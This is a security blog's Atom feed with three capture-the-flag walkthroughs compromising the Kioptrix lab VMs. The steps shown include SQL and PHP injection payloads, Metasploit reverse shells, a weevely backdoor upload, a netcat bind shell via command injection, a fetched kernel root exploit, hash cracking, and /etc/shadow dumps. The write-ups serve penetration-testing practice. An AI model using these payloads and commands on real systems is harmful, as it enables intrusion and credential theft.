<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Kioptrix | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/kioptrix/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-06T17:22:13+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 3]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/17/kioptrix-level-3/"/>
    <updated>2015-05-17T08:14:45+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/17/kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a></p>

<p>DHCP client is running on the image and we got assigned this IP address:
{% codeblock %}
$ tail -n 5 /var/db/vmware/vmnet-dhcpd-vmnet8.leases
lease 192.168.80.145 {
    starts 0 2015/05/17 06:14:07;
    ends 0 2015/05/17 06:44:07;
    hardware ethernet 00:0c:29:d6:3b:13;
}
{% endcodeblock %}</p>

<p>We add to &lsquo;/etc/hosts&rsquo;:
{% codeblock %}
192.168.80.145 kioptrix3.com
{% endcodeblock %}</p>

<p>Nmap output:
{% codeblock %}
root@kali32:~# nmap kioptrix3.com -p- -sV</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-25 20:23 CEST
Nmap scan report for kioptrix3.com (192.168.80.145)
Host is up (0.00025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:D6:3B:13 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
{% endcodeblock %}</p>

<p>Nikto output:
{% codeblock %}
root@kali32:/usr/share/exploitdb# nikto -h kioptrix3.com</p>

<h2>- Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.80.145</li>
<li>Target Hostname:    kioptrix3.com</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2015-04-25 20:44:13 (GMT2)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</li>
<li>Cookie PHPSESSID created without the httponly flag</li>
<li>Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009</li>
<li>PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.4.26)</li>
<li>Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>/phpmyadmin/: phpMyAdmin directory found</li>
<li>6543 requests: 0 error(s) and 16 item(s) reported on remote host

<ul>
<li>End Time:           2015-04-25 20:44:21 (GMT2) (8 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
{% endcodeblock %}</li>
</ul>


<p>After browsing the web page, we can find several vulnerabilities.</p>

<p>SQL injection:
{% codeblock %}
<a href="http://kioptrix3.com/gallery/gallery.php?id=1%27">http://kioptrix3.com/gallery/gallery.php?id=1%27</a>
{% endcodeblock %}</p>

<p>Remote Code execution:
{% codeblock %}
POST /index.php HTTP/1.1
Host: kioptrix3.com
User-Agent: Mozilla
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=cd5a425d8b3a044f54c070eb10470ff1
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 30</p>

<p>page=index&#8217;);eval(phpinfo());#
{% endcodeblock %}</p>

<p>The second one has a Metasploit module that we can use (for LotusCMS):
{% codeblock %}
msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options</p>

<p>Module options (exploit/multi/http/lcms_php_exec):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic LotusCMS 3.0</p>

<p>msf exploit(lcms_php_exec) > set RHOST kioptrix3.com
RHOST => kioptrix3.com
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.80.137:4444
[</em>] Using found page param: /index.php?page=index
[<em>] Sending exploit &hellip;
[</em>] Sending stage (40499 bytes) to 192.168.80.145
[*] Meterpreter session 1 opened (192.168.80.137:4444 -> 192.168.80.145:54507) at 2015-04-25 20:16:36 +0200
{% endcodeblock %}</p>

<p>We invoke a few commands to obtain the shell and upload weevely.
{% codeblock %}
meterpreter > sysinfo
Computer    : Kioptrix3
OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
Meterpreter : php/php</p>

<p>meterpreter > shell
Process 4662 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>

<p>cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash</p>

<p>uname -a
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# weevely generate 1234
[generate.php] Backdoor file &lsquo;weevely.php&rsquo; created with password &lsquo;1234&rsquo;</p>

<p>meterpreter > upload /root/weevely.php /home/www/kioptrix3.com/cache/
[<em>] uploading  : /root/weevely.php -> /home/www/kioptrix3.com/cache/
[</em>] uploaded   : /root/weevely.php -> /home/www/kioptrix3.com/cache//weevely.php</p>

<p>root@kali32:~# weevely <a href="http://kioptrix3.com/cache/weevely.php">http://kioptrix3.com/cache/weevely.php</a> 1234</p>

<p>www-data@:/home/www/kioptrix3.com $ :audit.userfiles
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;-+&ndash;+&ndash;+
| /home/loneferret/.bash_history | exists | readable |  |  |
| /home/loneferret/.ssh          | exists |          |  |  |
| /home/dreg/.profile            | exists | readable |  |  |
| /home/dreg/.bashrc             | exists | readable |  |  |
| /home/loneferret/.profile      | exists | readable |  |  |
| /home/dreg/.bash_logout        | exists | readable |  |  |
| /home/loneferret/.bash_logout  | exists | readable |  |  |
| /home/loneferret/.bashrc       | exists | readable |  |  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;-+&ndash;+&ndash;+</p>

<p>www-data@:/etc/apache2 $ cat /etc/apache2/conf.d/phpmyadmin.conf | grep htpasswd
AuthUserFile /etc/phpmyadmin/htpasswd.setup
                AuthUserFile /etc/phpmyadmin/htpasswd.setup
www-data@:/etc/apache2 $ cat /etc/phpmyadmin/htpasswd.setup
admin:*</p>

<p>www-data@:/home/www/kioptrix3.com $ cat gallery/gconfig.php
        $GLOBALS[&ldquo;gallarific_mysql_server&rdquo;] = &ldquo;localhost&rdquo;;
        $GLOBALS[&ldquo;gallarific_mysql_database&rdquo;] = &ldquo;gallery&rdquo;;
        $GLOBALS[&ldquo;gallarific_mysql_username&rdquo;] = &ldquo;root&rdquo;;
        $GLOBALS[&ldquo;gallarific_mysql_password&rdquo;] = &ldquo;fuckeyou&rdquo;;
{% endcodeblock %}</p>

<p>Now we can log to phpmyadmin (found for example by Nikto) with root / fuckeyou credentials:</p>

<p>We found the several interesting things:
{% codeblock %}
Browse gallarific_users: admin / n0t7t1k4
{% endcodeblock %}</p>

<p>In dev_accounts we have:
{% codeblock %}
dreg 0d3eccfb887aabd50f243b3f155c0f85
loneferret 5badcaf789d3d1d09794d8f021f40f0e
{% endcodeblock %}</p>

<p>Using John The Ripper password cracker:
{% codeblock %}
root@kali32:~# cat pass
loneferret:5badcaf789d3d1d09794d8f021f40f0e:::::::
dreg:0d3eccfb887aabd50f243b3f155c0f85:::::::
..
root@kali32:~# john pass &ndash;format=raw-md5 &ndash;show
loneferret:starwars:::::::
dreg:Mast3r:::::::</p>

<p>2 password hashes cracked, 0 left
{% endcodeblock %}</p>

<p>We log as loneferret user and after listing sudo -l we will see that the HT
Editor could be invoked.</p>

<p>In editor running with the root privileges we change the /etc/passwd entry
according:
{% codeblock %}
dreg:x:0:0:Dreg Gevans,0,555-5566,:/home/dreg:/bin/bash                                                                             │
{% endcodeblock %}</p>

<p>We log in as dreg / Mast3r with root privileges and read the congratulation
file, there is some information about alternative solutions / exploits:
{% codeblock %}
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>

<p>Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.</p>

<p>The object is to learn, do some research and have a little (legal)
fun in the process.</p>

<p>I hope you enjoyed this third challenge.</p>

<p>Steven McElrea
aka loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.</p>

<p>Main page CMS:
<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>

<p>Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
<a href="http://www.gallarific.com">http://www.gallarific.com</a>
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>

<p>The HT Editor can be found here:
<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
And the vulnerable version on Exploit-DB here:
<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>

<p>Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 2]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/11/kioptrix-level-2/"/>
    <updated>2015-05-11T19:15:08+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/11/kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a></p>

<p>Nmap output:
{% codeblock %}
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:4C (VMware)
{% endcodeblock %}</p>

<p>We connect to the web page and log in using username / password (SQLi):
{% codeblock %}
test&#8217; or &lsquo;1&rsquo;=&lsquo;1
{% endcodeblock %}</p>

<p>Now we got the access to the &ldquo;Basic Administrative Web Console&rdquo;. Trying command
injection, we found out that we can inject arbitrary command and execute under
web user privileges.</p>

<p>Request / response example:
{% codeblock %}
POST /pingit.php HTTP/1.1
Host: 192.168.80.144
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.144/index.php">http://192.168.80.144/index.php</a>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 45</p>

<p>ip=127.0.0.1 %26%26 cat /etc/passwd&amp;submit=submit
{% endcodeblock %}</p>

<p>{% codeblock %}
HTTP/1.1 200 OK
Date: Sat, 09 May 2015 15:02:56 GMT
Server: Apache/2.0.52 (CentOS)
X-Powered-By: PHP/4.3.9
Content-Length: 2187
Connection: close
Content-Type: text/html; charset=UTF-8</p>

<p>127.0.0.1 &amp;&amp; cat /etc/passwd<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.008 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.015 ms</p>

<p>&mdash; 127.0.0.1 ping statistics &mdash;
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.008/0.012/0.015/0.005 ms, pipe 2
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
<a href="news:x:9:13:news:/etc/news:">news:x:9:13:news:/etc/news:</a>
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
<a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP</a> User:/var/<a href="ftp:/sbin/nologin">ftp:/sbin/nologin</a>
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
</pre>
{% endcodeblock %}</p>

<p>Web server fingerprints:
{% codeblock %}
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
{% endcodeblock %}</p>

<p>We don&rsquo;t have writable access under DocumentRoot. Looking to different
directories, we found the netcat source remains.
{% codeblock %}
drwxrwxrwx  7 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1
drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc/drafts
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/po
drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib/contrib
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/src
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/m4
drwxrwxr-x  5 root sys 4096 Oct  7  2009 /etc/cups
drwxr-xrwx  4 root root 4096 May  9 12:11 /tmp
drwxrwxrwt  2 root root 4096 May  9 10:17 /tmp/.ICE-unix
drwxrwxrwt  2 root root 4096 May  9 10:18 /tmp/.font-unix
{% endcodeblock %}</p>

<p>So there should be netcat installed, we will need this information later.</p>

<p>We can read index.php for mysql credentials:
{% codeblock %}
ip=127.0.0.1 %26%26 cat index.php&amp;submit=submit
..
&lt;?php
    mysql_connect(&ldquo;localhost&rdquo;, &ldquo;john&rdquo;, &ldquo;hiroshima&rdquo;) or die(mysql_error());
    //print &ldquo;Connected to MySQL<br />&rdquo;;
    mysql_select_db(&ldquo;webapp&rdquo;);</p>

<pre><code>if ($_POST['uname'] != ""){
    $username = $_POST['uname'];
    $password = $_POST['psw'];
    $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
    //print $query."&lt;br&gt;";
    $result = mysql_query($query);

    $row = mysql_fetch_array($result);
    //print "ID: ".$row['id']."&lt;br /&gt;";
}
</code></pre>

<p>?>
{% endcodeblock %}</p>

<p>The john&rsquo;s password doesn&rsquo;t work for ssh, but at least we can extract more from
mysql database:
{% codeblock %}
ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&amp;submit=submit
Database
mysql
test
webapp</p>

<p>ip=127.0.0.1 %26%26 echo &lsquo;use webapp; show tables&rsquo;|mysql -ujohn -phiroshima&amp;submit=submit
id  username    password
1   admin   5afac8d85f
2   john    66lajGGbla
{% endcodeblock %}</p>

<p>Again, the passwords don&rsquo;t work for ssh.</p>

<p>We find netcat and use it to bind a shell, then we try to root the box:
{% codeblock %}
ip=127.0.0.1 %26%26 find / -iname *netcat*&amp;submit=submit
..
/usr/share/zsh/4.2.0/functions/_netcat
/usr/local/info/netcat.info
/usr/local/share/locale/sk/LC_MESSAGES/netcat.mo
/usr/local/share/locale/it/LC_MESSAGES/netcat.mo
/usr/local/man/man1/netcat.1
/usr/local/bin/netcat
/usr/src/netcat-0.7.1
/usr/src/netcat-0.7.1/doc/netcat.1
/usr/src/netcat-0.7.1/doc/netcat.info
/usr/src/netcat-0.7.1/doc/netcat.texi
/usr/src/netcat-0.7.1/doc/netcat.pod
/usr/src/netcat-0.7.1/po/netcat.pot
/usr/src/netcat-0.7.1/src/netcat.c
/usr/src/netcat-0.7.1/src/netcat.h
/usr/src/netcat-0.7.1/src/netcat.o
/usr/src/netcat-0.7.1/src/netcat
{% endcodeblock %}</p>

<p>{% codeblock %}
ip=127.0.0.1 %26%26 /usr/local/bin/netcat -e /bin/sh -l -p 1337&amp;submit=submit
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:/var/www# nc 192.168.80.144 1337</p>

<p>id
uid=48(apache) gid=48(apache) groups=48(apache)</p>

<p>uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
{% endcodeblock %}</p>

<p>Luckily, exploitdb contains local root exploit with exactly this version of kernel:
{% codeblock %}
root@kali32:/usr/share/exploitdb# grep -irn &lsquo;2.6.9-55.EL&rsquo; *
platforms/linux/local/9542.c:7:** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),
{% endcodeblock %}</p>

<p>As our last step, we download and compile this exploit
<a href="https://www.exploit-db.com/exploits/9542/">https://www.exploit-db.com/exploits/9542/</a> .</p>

<p>{% codeblock %}
cd /tmp/
wget <a href="https://www.exploit-db.com/download/9542">https://www.exploit-db.com/download/9542</a> -O 9542.c &ndash;no-check-certificate</p>

<p>gcc 9542.c
./a.out
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#</p>

<p>sh-3.00# cat /etc/shadow
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
bin:<em>:14525:0:99999:7:::
daemon:</em>:14525:0:99999:7:::
adm:<em>:14525:0:99999:7:::
lp:</em>:14525:0:99999:7:::
sync:<em>:14525:0:99999:7:::
shutdown:</em>:14525:0:99999:7:::
halt:<em>:14525:0:99999:7:::
mail:</em>:14525:0:99999:7:::
<a href="news:*:14525:0:99999:7:::">news:*:14525:0:99999:7:::</a>
uucp:<em>:14525:0:99999:7:::
operator:</em>:14525:0:99999:7:::
games:<em>:14525:0:99999:7:::
gopher:</em>:14525:0:99999:7:::
<a href="ftp:*:14525:0:99999:7:::">ftp:*:14525:0:99999:7:::</a>
nobody:*:14525:0:99999:7:::
dbus:!!:14525:0:99999:7:::
vcsa:!!:14525:0:99999:7:::
rpm:!!:14525:0:99999:7:::
haldaemon:!!:14525:0:99999:7:::
netdump:!!:14525:0:99999:7:::
nscd:!!:14525:0:99999:7:::
sshd:!!:14525:0:99999:7:::
rpc:!!:14525:0:99999:7:::
mailnull:!!:14525:0:99999:7:::
smmsp:!!:14525:0:99999:7:::
rpcuser:!!:14525:0:99999:7:::
nfsnobody:!!:14525:0:99999:7:::
pcap:!!:14525:0:99999:7:::
apache:!!:14525:0:99999:7:::
squid:!!:14525:0:99999:7:::
webalizer:!!:14525:0:99999:7:::
xfs:!!:14525:0:99999:7:::
ntp:!!:14525:0:99999:7:::
pegasus:!!:14525:0:99999:7:::
mysql:!!:14525::::::
john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
sh-3.00#
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/kioptrix-level-1/"/>
    <updated>2015-05-10T13:34:07+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>

<p>Nmap output:
{% codeblock %}
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
1024/tcp open  status      1 (RPC #100024)
{% endcodeblock %}</p>

<p>Enumeration of Samba:
{% codeblock %}
root@kali32:/usr/share/exploitdb# nmblookup -A 192.168.0.26
Looking up status of 192.168.0.26
        KIOPTRIX        <00> -         B <ACTIVE>
        KIOPTRIX        <03> -         B <ACTIVE>
        KIOPTRIX        <20> -         B <ACTIVE>
        ..<strong>MSBROWSE</strong>. <01> - <GROUP> B <ACTIVE>
        MYGROUP         <00> - <GROUP> B <ACTIVE>
        MYGROUP         <1d> -         B <ACTIVE>
        MYGROUP         <1e> - <GROUP> B <ACTIVE></p>

<pre><code>    MAC Address = 00-00-00-00-00-00
</code></pre>

<p>root@kali32:/usr/share/exploitdb# smbclient -L\ -I 192.168.0.26
Enter root&rsquo;s password:
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</p>

<pre><code>    Sharename       Type      Comment
    ---------       ----      -------
    IPC$            IPC       IPC Service (Samba Server)
    ADMIN$          IPC       IPC Service (Samba Server)
</code></pre>

<p>Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</p>

<pre><code>    Server               Comment
    ---------            -------
    KIOPTRIX             Samba Server

    Workgroup            Master
    ---------            -------
    MYGROUP              KIOPTRIX
</code></pre>

<p>{% endcodeblock %}</p>

<p>The service is running with the root privileges and we can use exploit in Metasploit to obtain root account:
{% codeblock %}
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > setg RHOST 192.168.80.141
RHOST => 192.168.80.141
msf exploit(trans2open) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.80.137:4444
[</em>] Trying return address 0xbffffdfc&hellip;
[<em>] Trying return address 0xbffffcfc&hellip;
[</em>] Trying return address 0xbffffbfc&hellip;
[<em>] Trying return address 0xbffffafc&hellip;
[</em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.141:1026) at 2015-04-27 06:43:53 +0200
{% endcodeblock %}</p>

<p>Because Apache is vulnerable, there is another solution. Nikto reports something interesting:
{% codeblock %}
mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
{% endcodeblock %}</p>

<p>Web server signature:
{% codeblock %}
Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
{% endcodeblock %}</p>

<p>In exploitdb we find:
{% codeblock %}
Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c) | /linux/remote/764.c
{% endcodeblock %}</p>

<p>Because the exploit is pretty old, we need to update it with these <a href="https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">steps</a>:
{% codeblock %}</p>

<h1>include &lt;openssl/rc4.h></h1>

<h1>include &lt;openssl/md5.h></h1>

<p>&hellip;
<a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>
&hellip;</p>

<h1>gcc -o OpenFuck 764.c -lcrypto</h1>

<p>{% endcodeblock %}</p>

<p>Finally we run the exploit and cat /etc/shadow with the root privileges.
{% codeblock %}
cat /etc/shadow
root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
bin:<em>:14513:0:99999:7:::
daemon:</em>:14513:0:99999:7:::
adm:<em>:14513:0:99999:7:::
lp:</em>:14513:0:99999:7:::
sync:<em>:14513:0:99999:7:::
shutdown:</em>:14513:0:99999:7:::
halt:<em>:14513:0:99999:7:::
mail:</em>:14513:0:99999:7:::
